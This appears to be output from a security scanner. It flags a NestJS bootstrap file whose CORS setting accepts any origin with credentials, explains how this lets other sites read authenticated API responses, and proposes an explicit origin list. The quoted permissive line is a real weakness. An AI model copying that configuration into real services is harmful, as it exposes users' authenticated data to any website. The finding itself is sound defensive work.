HIGH  likely  unknown  Cross-origin policy accepts any origin  A05:2021
------------------------------------------------------------------------
 src/main.ts:10:3

   8 | async function bootstrap() {
   9 |   const app = await NestFactory.create(AppModule)
  10 |   app.enableCors({ origin: true, credentials: true })
     |   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ accepts requests from any origin
  11 |   await app.listen(3000)
  12 | }

 -> fix (NestJS)   Give enableCors an explicit origin list.
                   app.enableCors({
                     origin: ['https://app.example.com'],
                     credentials: true,
                   })
 -> why            The response echoes the caller's origin and permits
                   credentials, so any site a logged-in user visits can
                   make authenticated requests to this API and read the
                   replies. The browser's same-origin protection is
                   switched off for every origin.
 i  ref            OWASP A05:2021 | CWE-942 | RULES.md#cors-permissive

